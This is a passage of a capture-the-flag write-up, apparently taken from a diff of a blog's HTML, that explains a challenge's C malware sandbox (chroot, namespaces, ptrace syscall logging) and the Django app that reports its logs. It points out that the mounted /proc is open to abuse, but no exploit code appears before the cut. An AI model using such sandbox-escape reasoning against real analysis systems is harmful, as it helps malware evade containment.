+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>seteuid</span><span class=mtk1>(</span><span class=mtk6>1001</span><span class=mtk1>))</span> <span class=mtk1>{</span><span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"SEUID"</span><span class=mtk1>);};</span>
+    <span class=mtk8>do_trace</span><span class=mtk1>();</span>
+    <span class=mtk8>sleep</span><span class=mtk1>(</span><span class=mtk6>3</span><span class=mtk1>);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Another useful function is <code>copy_libs</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>copy_libs</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+    <span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class=mtk1>libs</span><span class=mtk5>[]</span> <span class=mtk5>=</span> <span class=mtk1>{</span><span class=mtk4>"libc.so.6"</span><span class=mtk1>,</span> <span class=mtk8>NULL</span><span class=mtk1>};</span>
+    <span class="mtk7 mtki">char</span> <span class=mtk1>path</span><span class=mtk1>[</span><span class=mtk8>FILENAME_MAX</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>{</span><span class=mtk6>0</span><span class=mtk1>};</span>
+    <span class="mtk7 mtki">char</span> <span class=mtk1>outpath</span><span class=mtk1>[</span><span class=mtk8>FILENAME_MAX</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>{</span><span class=mtk6>0</span><span class=mtk1>};</span>
+    <span class=mtk8>system</span><span class=mtk1>(</span><span class=mtk4>"mkdir</span> <span class=mtk4>-p</span> <span class=mtk4>bin</span> <span class=mtk4>usr/lib/x86_64-linux-gnu</span> <span class=mtk4>usr/lib64;</span> <span class=mtk4>cp</span> <span class=mtk4>/bin/sh</span> <span class=mtk4>bin"</span><span class=mtk1>);</span>  
+    <span class=mtk5>for</span> <span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk1>i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>libs</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]</span> <span class=mtk5>!=</span> <span class=mtk8>NULL</span><span class=mtk1>;</span> <span class=mtk1>i</span><span class=mtk5>++</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>sprintf</span><span class=mtk1>(</span><span class=mtk1>path</span><span class=mtk1>,</span> <span class=mtk4>"/lib/x86_64-linux-gnu/</span><span class=mtk6>%s</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>libs</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]);</span>
+        <span class=mtk3>//</span> <span class=mtk3>sprintf(path,</span> <span class=mtk3>"/lib/%s",</span> <span class=mtk3>libs[i]);</span>
+        <span class=mtk8>sprintf</span><span class=mtk1>(</span><span class=mtk1>outpath</span><span class=mtk1>,</span> <span class=mtk4>"./usr/lib/</span><span class=mtk6>%s</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>libs</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>]);</span>
+        <span class=mtk8>copy</span><span class=mtk1>(</span><span class=mtk1>path</span><span class=mtk1>,</span> <span class=mtk1>outpath</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class=mtk8>copy</span><span class=mtk1>(</span><span class=mtk4>"/lib64/ld-linux-x86-64.so.2"</span><span class=mtk1>,</span> <span class=mtk4>"./usr/lib64/ld-linux-x86-64.so.2"</span><span class=mtk1>);</span>
+    <span class=mtk8>system</span><span class=mtk1>(</span><span class=mtk4>"ln</span> <span class=mtk4>-s</span> <span class=mtk4>usr/lib64</span> <span class=mtk4>lib64;</span> <span class=mtk4>ln</span> <span class=mtk4>-s</span> <span class=mtk4>usr/lib</span> <span class=mtk4>lib;</span> <span class=mtk4>chmod</span> <span class=mtk4>755</span> <span class=mtk4>-R</span> <span class=mtk4>usr</span> <span class=mtk4>bin"</span><span class=mtk1>);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Which shows that inside the jail we will have Glibc and <code>/bin/sh</code>.</p><p>And there is another interesting function called <code>do_namespaces</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>do_namespaces</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>unshare</span><span class=mtk1>(CLONE_NEWPID</span><span class=mtk5>|</span><span class=mtk1>CLONE_NEWNET)</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span><span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Couldn't</span> <span class=mtk4>make</span> <span class=mtk4>namespaces"</span><span class=mtk1>);};</span>  
+    <span class=mtk3>//</span> <span class=mtk3>Create</span> <span class=mtk3>pid-1</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>fork</span><span class=mtk1>()</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span><span class=mtk8>sleep</span><span class=mtk1>(</span><span class=mtk6>6</span><span class=mtk1>);</span> <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);}</span>
+    <span class=mtk8>mkdir</span><span class=mtk1>(</span><span class=mtk4>"./proc"</span><span class=mtk1>,</span> <span class=mtk5>0</span><span class=mtk6>555</span><span class=mtk1>);</span>
+    <span class=mtk8>mount</span><span class=mtk1>(</span><span class=mtk4>"/proc"</span><span class=mtk1>,</span> <span class=mtk4>"./proc"</span><span class=mtk1>,</span> <span class=mtk4>"proc"</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk8>NULL</span><span class=mtk1>);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>This one does something that can be abused. It is mounting the <code>/proc</code> directory of a child process of <code>sandbox</code> into the jail. This fact is useful for exploitation because we can read information about the <code>sandbox</code> process.</p><p>Finally, the function <code>make_jail</code> creates the <code>chroot</code> environment and changes to that directory, sets the user and group permissions to UID/GID 1001 and finally calls <code>do_trace</code> to trace the malware behavior:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>do_trace</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+    <span class=mtk3>//</span> <span class=mtk3>We</span> <span class=mtk3>started</span> <span class=mtk3>with</span> <span class=mtk3>capabilities</span> <span class=mtk3>-</span> <span class=mtk3>we</span> <span class=mtk3>must</span> <span class=mtk3>reset</span> <span class=mtk3>the</span> <span class=mtk3>dumpable</span> <span class=mtk3>flag</span>  
+    <span class=mtk3>//</span> <span class=mtk3>so</span> <span class=mtk3>that</span> <span class=mtk3>the</span> <span class=mtk3>child</span> <span class=mtk3>can</span> <span class=mtk3>be</span> <span class=mtk3>traced</span>
+    <span class=mtk8>prctl</span><span class=mtk1>(PR_SET_DUMPABLE,</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+    <span class=mtk3>//</span> <span class=mtk3>Remove</span> <span class=mtk3>dangerous</span> <span class=mtk3>capabilities</span> <span class=mtk3>before</span> <span class=mtk3>the</span> <span class=mtk3>child</span> <span class=mtk3>starts</span>
+    <span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_cap_header_struct</span> <span class=mtk1>header</span><span class=mtk1>;</span>
+    <span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_cap_data_struct</span> <span class=mtk1>caps</span><span class=mtk1>;</span>
+    <span class="mtk7 mtki">char</span> <span class=mtk1>pad</span><span class=mtk1>[</span><span class=mtk6>32</span><span class=mtk1>];</span>
+    <span class=mtk1>header</span><span class=mtk1>.</span><span class=mtk1>version</span> <span class=mtk5>=</span> <span class=mtk1>_LINUX_CAPABILITY_VERSION_3;</span>
+    <span class=mtk1>header</span><span class=mtk1>.</span><span class=mtk1>pid</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+    <span class=mtk1>caps</span><span class=mtk1>.</span><span class=mtk1>effective</span> <span class=mtk5>=</span> <span class=mtk1>caps</span><span class=mtk1>.</span><span class=mtk1>inheritable</span> <span class=mtk5>=</span> <span class=mtk1>caps</span><span class=mtk1>.</span><span class=mtk1>permitted</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+    <span class=mtk8>syscall</span><span class=mtk1>(SYS_capget,</span> <span class=mtk5>&amp;</span><span class=mtk1>header</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>caps</span><span class=mtk1>);</span>
+    <span class=mtk1>caps</span><span class=mtk1>.</span><span class=mtk1>effective</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+    <span class=mtk1>caps</span><span class=mtk1>.</span><span class=mtk1>permitted</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+    <span class=mtk8>syscall</span><span class=mtk1>(SYS_capset,</span> <span class=mtk5>&amp;</span><span class=mtk1>header</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>caps</span><span class=mtk1>);</span>
+    <span class="mtk7 mtki">int</span> <span class=mtk1>child</span> <span class=mtk5>=</span> <span class=mtk8>fork</span><span class=mtk1>();</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk1>child</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Couldn't</span> <span class=mtk4>fork"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk1>child</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>do_child</span><span class=mtk1>();</span>
+    <span class=mtk1>}</span>
+    <span class="mtk7 mtki">int</span> <span class=mtk1>killer</span> <span class=mtk5>=</span> <span class=mtk8>fork</span><span class=mtk1>();</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk1>killer</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Couldn't</span> <span class=mtk4>fork</span> <span class=mtk4>(2)"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk1>killer</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>do_killer</span><span class=mtk1>(</span><span class=mtk1>child</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+        <span class=mtk8>do_log</span><span class=mtk1>(</span><span class=mtk1>child</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>This function is a bit large, but it is not complex. It does a first fork and calls <code>do_child</code> which basically enables the malware binary to be dumpable by <code>ptrace</code> and runs it with <code>execve</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>do_child</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+    <span class=mtk3>//</span> <span class=mtk3>Prevent</span> <span class=mtk3>child</span> <span class=mtk3>process</span> <span class=mtk3>from</span> <span class=mtk3>escaping</span> <span class=mtk3>chroot</span>  
+    <span class=mtk8>close</span><span class=mtk1>(</span><span class=mtk1>jailsfd</span><span class=mtk1>);</span>
+    <span class=mtk8>prctl</span><span class=mtk1>(PR_SET_PDEATHSIG,</span> <span class=mtk8>SIGHUP</span><span class=mtk1>);</span>
+    <span class=mtk8>ptrace</span><span class=mtk1>(PTRACE_TRACEME,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk8>NULL</span><span class=mtk1>,</span> <span class=mtk8>NULL</span><span class=mtk1>);</span>
+    <span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class=mtk1>args</span><span class=mtk5>[]</span> <span class=mtk5>=</span> <span class=mtk1>{</span><span class=mtk8>NULL</span><span class=mtk1>};</span>
+    <span class=mtk8>execve</span><span class=mtk1>(</span><span class=mtk4>"/userprog"</span><span class=mtk1>,</span> <span class=mtk1>args</span><span class=mtk1>,</span> <span class=mtk8>NULL</span><span class=mtk1>);</span>
+    <span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Couldn't</span> <span class=mtk4>execute</span> <span class=mtk4>user</span> <span class=mtk4>program"</span><span class=mtk1>);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Then, it forks again and kills the malware execution after 5 seconds with <code>do_killer</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>do_killer</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">pid</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk8>sleep</span><span class=mtk1>(</span><span class=mtk6>5</span><span class=mtk1>);</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk8>kill</span><span class=mtk1>(</span><span class="mtk9 mtki">pid</span><span class=mtk1>,</span> <span class=mtk8>SIGKILL</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span><span class=mtk8>DIE</span><span class=mtk1>(</span><span class=mtk4>"Kill</span> <span class=mtk4>err"</span><span class=mtk1>);}</span>  
+    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Killed</span> <span class=mtk4>subprocess"</span><span class=mtk1>);</span>
+    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>And at the same time, the function calls <code>do_log</code>, which is a function that uses <code>ptrace</code> to extract all the <code>syscall</code> instructions used by the malware binary (actually in another function called <code>log_syscall</code>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>log_syscall</span><span class=mtk1>(</span><span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_regs_struct</span> <span class="mtk9 mtki">regs</span><span class=mtk1>,</span> <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk9 mtki">ret</span><span class=mtk1>)</span> <span class=mtk1>{</span>  
+    <span class="mtk8 mtku">registers</span> <span class=mtk1>result</span><span class=mtk1>;</span>
+    <span class=mtk1>result</span><span class=mtk1>.</span><span class=mtk1>rax</span> <span class=mtk5>=</span> <span class="mtk9 mtki">regs</span><span class=mtk1>.orig_rax;</span>
+    <span class=mtk1>result</span><span class=mtk1>.</span><span class=mtk1>rdi</span> <span class=mtk5>=</span> <span class="mtk9 mtki">regs</span><span class=mtk1>.rdi;</span>
+    <span class=mtk1>result</span><span class=mtk1>.</span><span class=mtk1>rsi</span> <span class=mtk5>=</span> <span class="mtk9 mtki">regs</span><span class=mtk1>.rsi;</span>
+    <span class=mtk1>result</span><span class=mtk1>.</span><span class=mtk1>rdx</span> <span class=mtk5>=</span> <span class="mtk9 mtki">regs</span><span class=mtk1>.rdx;</span>
+    <span class=mtk1>result</span><span class=mtk1>.</span><span class=mtk1>r10</span> <span class=mtk5>=</span> <span class="mtk9 mtki">regs</span><span class=mtk1>.r10;</span>
+    <span class=mtk1>result</span><span class=mtk1>.</span><span class=mtk1>r8</span>  <span class=mtk5>=</span> <span class="mtk9 mtki">regs</span><span class=mtk1>.r8;</span>
+    <span class=mtk1>result</span><span class=mtk1>.</span><span class=mtk1>r9</span>  <span class=mtk5>=</span> <span class="mtk9 mtki">regs</span><span class=mtk1>.r9;</span>
+    <span class=mtk1>result</span><span class=mtk1>.</span><span class=mtk1>ret</span> <span class=mtk5>=</span> <span class="mtk9 mtki">ret</span><span class=mtk1>;</span>
+    <span class="mtk7 mtki">int</span> <span class=mtk1>fd</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>"/log"</span><span class=mtk1>,</span> <span class=mtk8>O_CREAT</span><span class=mtk5>|</span><span class=mtk8>O_RDWR</span><span class=mtk5>|</span><span class=mtk8>O_APPEND</span><span class=mtk1>,</span> <span class=mtk5>0</span><span class=mtk6>777</span><span class=mtk1>);</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk1>fd</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk5>return</span><span class=mtk1>;</span>
+    <span class=mtk1>}</span>
+    <span class=mtk8>write</span><span class=mtk1>(</span><span class=mtk1>fd</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>result</span><span class=mtk1>,</span> <span class=mtk5>sizeof</span><span class=mtk1>(</span><span class="mtk8 mtku">registers</span><span class=mtk1>));</span>
+    <span class=mtk8>close</span><span class=mtk1>(</span><span class=mtk1>fd</span><span class=mtk1>);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>All the <code>syscall</code> instructions will be added to a <code>log</code> file that is inside the <code>chroot</code> environment. And this <code>log</code> file is analyzed by the web server and printed out as a report.</p><h2 id=analyzing-web-application>Analyzing web application</h2><p>We are also given the web application source code, which is a Django application (written in Python). Django projects have a lot of files, but most of them are default ones.</p><p>This is the function that executes the malware binary inside the sandbox (<code>scanner/views.py</code>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">def</span> <span class=mtk8>handle_file</span><span class=mtk1>(</span><span class="mtk9 mtki">file</span><span class=mtk1>):</span>
+    <span class=mtk1>md5</span> <span class=mtk5>=</span> <span class=mtk8>calculate_file_md5</span>(<span class="mtk9 mtki">file</span><span class=mtk1>)</span>
+    <span class=mtk1>path</span> <span class=mtk5>=</span> <span class="mtk7 mtki">f</span><span class=mtk4>"</span><span class=mtk6>{</span><span class=mtk1>settings</span><span class=mtk1>.</span><span class=mtk6>FILE_PATH}</span><span class=mtk4>/</span><span class=mtk6>{</span><span class=mtk1>md5</span><span class=mtk6>}</span><span class=mtk4>"</span>
+    <span class=mtk5>with</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk1>path</span><span class=mtk1>,</span> <span class=mtk4>'wb+'</span><span class=mtk1>)</span> <span class=mtk5>as</span> <span class=mtk1>f</span><span class=mtk1>:</span>
+        <span class=mtk5>for</span> <span class=mtk1>chunk</span> <span class=mtk5>in</span> <span class="mtk9 mtki">file</span><span class=mtk1>.chunks():</span>
+            <span class=mtk1>f</span><span class=mtk1>.</span><span class=mtk8>write</span><span class=mtk1>(</span><span class=mtk1>chunk</span><span class=mtk1>)</span>
+    <span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>system</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>"cd</span> <span class=mtk6>{</span><span class=mtk1>settings</span><span class=mtk1>.</span><span class=mtk6>SBX_PATH}</span><span class=mtk4>;</span> <span class=mtk4>./sandbox</span> <span class=mtk6>{</span><span class=mtk1>path</span><span class=mtk6>}</span> <span class=mtk6>{</span><span class=mtk1>md5</span><span class=mtk6>}</span><span class=mtk4>"</span><span class=mtk1>)</span>  
+    <span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>remove</span><span class=mtk1>(</span><span class=mtk1>path</span><span class=mtk1>)</span>
+    <span class=mtk5>return</span> <span class=mtk1>md5</span>
+</code></pre></div><p>We might think of command injection because of string interpolation, but none of the variables seem to be external, so we can&rsquo;t control them.</p><p>Inside <code>viewer/views.py</code> we see two functions:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">def</span> <span class=mtk8>view_file</span><span class=mtk1>(</span><span class="mtk9 mtki">request</span><span class=mtk1>,</span> <span class="mtk9 mtki">md5</span><span class=mtk1>:</span> <span class="mtk8 mtku">str</span><span class=mtk1>):</span>
+    <span class=mtk1>path</span> <span class=mtk5>=</span> <span class="mtk7 mtki">f</span><span class=mtk4>"</span><span class=mtk6>{</span><span class=mtk1>settings</span><span class=mtk1>.</span><span class=mtk6>SBX_PATH}</span><span class=mtk4>/jails/</span><span class=mtk6>{</span><span class="mtk9 mtki">md5</span><span class=mtk6>}</span><span class=mtk4>"</span>
+    <span class=mtk5>if</span> <span class=mtk5>not</span> <span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class="mtk8 mtku">path</span><span class=mtk1>.</span><span class=mtk8>exists</span><span class=mtk1>(</span><span class=mtk1>path</span><span class=mtk1>):</span>
+        <span class=mtk5>raise</span> <span class="mtk8 mtku">Http404</span><span class=mtk1>(</span><span class=mtk4>"A</span> <span class=mtk4>sample</span> <span class=mtk4>with</span> <span class=mtk4>this</span> <span class=mtk4>hash</span> <span class=mtk4>has</span> <span class=mtk4>not</span> <span class=mtk4>been</span> <span class=mtk4>uploaded."</span><span class=mtk1>)</span>
+    <span class=mtk1>logfile</span> <span class=mtk5>=</span> <span class="mtk7 mtki">f</span><span class=mtk4>"</span><span class=mtk6>{</span><span class=mtk1>path</span><span class=mtk6>}</span><span class=mtk4>/log"</span>
+    <span class=mtk5>if</span> <span class=mtk5>not</span> <span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class="mtk8 mtku">path</span><span class=mtk1>.</span><span class=mtk8>exists</span><span class=mtk1>(</span><span class=mtk1>logfile</span><span class=mtk1>):</span>
+        <span class=mtk5>return</span> <span class="mtk8 mtku">HttpResponse</span><span class=mtk1>(</span><span class=mtk4>"There</span> <span class=mtk4>was</span> <span class=mtk4>an</span> <span class=mtk4>error</span> <span class=mtk4>logging</span> <span class=mtk4>this</span> <span class=mtk4>application"</span><span class=mtk1>)</span>
+    <span class=mtk1>syscalls</span> <span class=mtk5>=</span> <span class=mtk1>[</span><span class=mtk1>call</span><span class=mtk1>.render()</span> <span class=mtk5>for</span> <span class=mtk1>call</span> <span class=mtk5>in</span> <span class=mtk8>parse_log</span><span class=mtk1>(</span><span class=mtk1>logfile</span><span class=mtk1>)]</span>
+    <span class=mtk1>ignore</span> <span class=mtk5>=</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">filter</span><span class=mtk1>(</span><span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">call</span><span class=mtk1>:</span> <span class="mtk9 mtki">call</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Ignore</span><span class=mtk1>,</span> <span class=mtk1>syscalls</span><span class=mtk1>))</span>
+    <span class=mtk1>low</span> <span class=mtk5>=</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">filter</span><span class=mtk1>(</span><span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">call</span><span class=mtk1>:</span> <span class="mtk9 mtki">call</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Low</span><span class=mtk1>,</span> <span class=mtk1>syscalls</span><span class=mtk1>))</span>
+    <span class=mtk1>med</span> <span class=mtk5>=</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">filter</span><span class=mtk1>(</span><span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">call</span><span class=mtk1>:</span> <span class="mtk9 mtki">call</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk1>syscalls</span><span class=mtk1>))</span>
+    <span class=mtk1>high</span> <span class=mtk5>=</span> <span class="mtk8 mtku">list</span><span class=mtk1>(</span><span class="mtk8 mtku">filter</span><span class=mtk1>(</span><span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">call</span><span class=mtk1>:</span> <span class="mtk9 mtki">call</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk1>syscalls</span><span class=mtk1>))</span>
+    <span class=mtk1>render_vars</span> <span class=mtk5>=</span> <span class=mtk1>{</span><span class=mtk4>"md5"</span><span class=mtk1>:</span> <span class="mtk9 mtki">md5</span><span class=mtk1>,</span> <span class=mtk4>"ignore"</span><span class=mtk1>:</span> <span class=mtk1>ignore</span><span class=mtk1>,</span> <span class=mtk4>"low"</span><span class=mtk1>:</span> <span class=mtk1>low</span><span class=mtk1>,</span> <span class=mtk4>"med"</span><span class=mtk1>:</span> <span class=mtk1>med</span><span class=mtk1>,</span> <span class=mtk4>"high"</span><span class=mtk1>:</span> <span class=mtk1>high</span><span class=mtk1>}</span>  
+    <span class=mtk5>return</span> <span class=mtk8>render</span><span class=mtk1>(</span><span class="mtk9 mtki">request</span><span class=mtk1>,</span> <span class=mtk4>'view.html'</span><span class=mtk1>,</span> <span class=mtk1>render_vars</span><span class=mtk1>)</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>parse_log</span><span class=mtk1>(</span><span class="mtk9 mtki">path</span><span class=mtk1>):</span>
+    <span class=mtk1>syscalls</span> <span class=mtk5>=</span> <span class=mtk1>[]</span>
+    <span class=mtk5>with</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class="mtk9 mtki">path</span><span class=mtk1>,</span> <span class=mtk4>'rb'</span><span class=mtk1>)</span> <span class=mtk5>as</span> <span class=mtk1>f</span><span class=mtk1>:</span>
+        <span class=mtk1>chunk</span> <span class=mtk5>=</span> <span class=mtk1>f</span><span class=mtk1>.</span><span class=mtk8>read</span><span class=mtk1>(</span><span class=mtk6>8</span> <span class=mtk5>*</span> <span class=mtk6>8</span><span class=mtk1>)</span>
+        <span class=mtk1>nums</span> <span class=mtk5>=</span> <span class="mtk8 mtku">struct</span><span class=mtk1>.</span><span class=mtk8>unpack</span><span class=mtk1>(</span><span class=mtk4>"q"</span> <span class=mtk5>*</span> <span class=mtk6>8</span><span class=mtk1>,</span> <span class=mtk1>chunk</span><span class=mtk1>)</span>
+        <span class=mtk5>while</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>chunk</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk6>8</span><span class=mtk5>*</span><span class=mtk6>8</span><span class=mtk1>:</span>
+            <span class=mtk1>nums</span> <span class=mtk5>=</span> <span class="mtk8 mtku">struct</span><span class=mtk1>.</span><span class=mtk8>unpack</span><span class=mtk1>(</span><span class=mtk4>"q"</span> <span class=mtk5>*</span> <span class=mtk6>8</span><span class=mtk1>,</span> <span class=mtk1>chunk</span><span class=mtk1>)</span>
+            <span class=mtk1>call</span> <span class=mtk5>=</span> <span class="mtk8 mtku">LoggedSyscall</span><span class=mtk1>(</span><span class=mtk1>nums</span><span class=mtk1>)</span>
+            <span class=mtk1>syscalls</span><span class=mtk1>.</span><span class=mtk8>append</span><span class=mtk1>(</span><span class=mtk1>call</span><span class=mtk1>)</span>
+            <span class=mtk1>chunk</span> <span class=mtk5>=</span> <span class=mtk1>f</span><span class=mtk1>.</span><span class=mtk8>read</span><span class=mtk1>(</span><span class=mtk6>8</span> <span class=mtk5>*</span> <span class=mtk6>8</span><span class=mtk1>)</span>
+    <span class=mtk5>return</span> <span class=mtk1>syscalls</span>
+</code></pre></div><p>These functions are used to parse the <code>log</code> file generated by the <code>sandbox</code> binary, and render them in the report.</p><p>We can see another file <code>viewer/syscalls.py</code> where the <code>syscall</code> instructions found in the <code>log</code> file are parsed and classified depending on the registers setup (<code>$rax</code>, <code>$rdi</code>, <code>$rsi</code>&mldr;):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">numbers</span>
+<span class=mtk5>import</span> <span class="mtk8 mtku">enum</span>
+<span class=mtk5>from</span> <span class="mtk8 mtku">typing</span> <span class=mtk5>import</span> <span class=mtk1>List</span><span class=mtk1>,</span> <span class="mtk8 mtku">Tuple</span>
+
+
